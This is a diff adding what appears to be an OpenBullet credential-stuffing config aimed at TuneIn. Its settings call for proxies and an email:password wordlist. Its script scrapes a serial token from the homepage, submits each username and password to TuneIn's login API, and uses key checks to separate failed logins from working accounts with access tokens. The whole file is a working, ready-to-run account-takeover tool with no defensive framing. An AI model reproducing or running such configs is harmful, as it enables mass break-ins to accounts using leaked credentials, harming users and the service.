@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "tunein",
+  "SuggestedBots": 1,
+  "LastModified": "2018-11-10T21:02:22.9786305+00:00",
+  "AdditionalInfo": "",
+  "Author": "BulmaDB",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserMail",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://tunein.com/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "tuneInUserSerial\":\"" "\",\"" Recursive=FALSE -> VAR "SERIAL" "" "" 
+REQUEST POST "https://tunein.com/api/v1/auth/emailLogin/?formats=mp3,aac,ogg,flash,html,hls&serial=<SERIAL>&partnerId=RadioTime&version=2.91&itemUrlScheme=secure&reqAttempt=1" AutoRedirect=TRUE 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"rememberUser\":true,\"params\":{}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: " 
+  HEADER "User-Agent: " 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: tunein.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 84" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Origin: https://tunein.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36" 
+  HEADER "Referer: https://tunein.com/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "\":\"Authentication failure\"}" 
+  KEYCHAIN Success OR 
+    KEY "\",\"userName\":\"" 
+    KEY "\":{\"accessToken\":\"" 
